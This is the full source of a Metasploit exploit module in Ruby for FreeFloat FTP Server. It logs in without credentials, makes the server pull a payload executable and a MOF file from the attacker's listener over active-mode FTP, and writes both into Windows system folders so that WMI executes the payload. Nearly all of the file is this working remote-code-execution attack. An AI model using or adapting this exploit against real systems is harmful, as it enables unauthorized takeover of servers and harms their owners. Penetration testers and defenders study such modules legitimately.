# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "FreeFloat FTP Server Arbitrary File Upload",
      &#039;Description&#039;    => %q{
          This module abuses multiple issues in FreeFloat: 1. No credential is actually
        needed to login; 2. User&#039;s default path is in C:\, and this cannot be changed;
        3. User can write to anywhere on the server&#039;s file system.  As a result of these
        poor implementations, a malicious user can just log in and then upload files,
        and let WMI (Management Instrumentation service) to execute the payload uploaded.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;sinn3r&#039;, # Vulnerability discovery, Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://metasploit.com&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;FreeFloat&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Dec 7 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        # Change the default description so this option makes sense
        OptPort.new(&#039;SRVPORT&#039;, [true, &#039;The local port to listen on for active mode&#039;, 8080])
      ], self.class)

    deregister_options(&#039;FTPUSER&#039;, &#039;FTPPASS&#039;) # Using empty user and password
  end


  def check
    connect
    disconnect

    if banner =~ /FreeFloat/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end


  def on_client_connect(cli)
    peer = "#{cli.peerhost}:#{cli.peerport}"

    case @stage
    when :exe
      print_status("#{peer} - Sending executable (#{@exe.length.to_s} bytes)")
      cli.put(@exe)
      @stage = :mof

    when :mof
      print_status("#{peer} - Sending MOF (#{@mof.length.to_s} bytes)")
      cli.put(@mof)
    end

    cli.close
  end


  def upload(filename)
    select(nil, nil, nil, 1)

    peer = "#{rhost}:#{rport}"
    print_status("#{peer} - Trying to upload #{::File.basename(filename)}")

    conn = connect(false, datastore[&#039;VERBOSE&#039;])

    print_status("#{peer} - Sending empty login...")

    res = send_user("", conn)
    if not res or res !~ /331/
      print_error("#{peer} - Error sending username")
      return false
    end

    res = send_pass("", conn)
    if not res or res !~ /230/
      print_error("#{peer} - Error sending password")
      return false
    end

    print_good("#{peer} - Empty authentication was successful")

    # Switch to binary mode
    print_status("#{peer} - Set binary mode")
    send_cmd([&#039;TYPE&#039;, &#039;I&#039;], true, conn)

    # Prepare active mode: Get attacker&#039;s IP and source port
    src_ip   = datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039; ? Rex::Socket.source_address : datastore[&#039;SRVHOST&#039;]
    src_port = datastore[&#039;SRVPORT&#039;].to_i

    # Prepare active mode: Convert the IP and port for active mode
    src_ip   = src_ip.gsub(/\./, &#039;,&#039;)
    src_port = "#{src_port/256},#{src_port.remainder(256)}"

    # Set to active mode
    print_status("#{peer} - Set active mode \"#{src_ip},#{src_port}\"")
    send_cmd([&#039;PORT&#039;, "#{src_ip},#{src_port}"], true, conn)

    # Tell the FTP server to download our file
    send_cmd([&#039;STOR&#039;, filename], false, conn)

    disconnect(conn)
  end


  def exploit

    exe_name = "WINDOWS/system32/#{rand_text_alpha(rand(10)+5)}.exe"
    mof_name = "WINDOWS/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.mof"
    @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
    @exe      = generate_payload_exe
    @stage = :exe

    begin
      t = framework.threads.spawn("reqs", false) {
        # Upload our malicious executable
        u = upload(exe_name)
        # Upload the mof file
        upload(mof_name) if u
        register_file_for_cleanup("#{::File.basename(exe_name)}")
        register_file_for_cleanup("wbem\\mof\\good\\#{::File.basename(mof_name)}")
      }
      super
    ensure
      t.kill
    end
  end

end

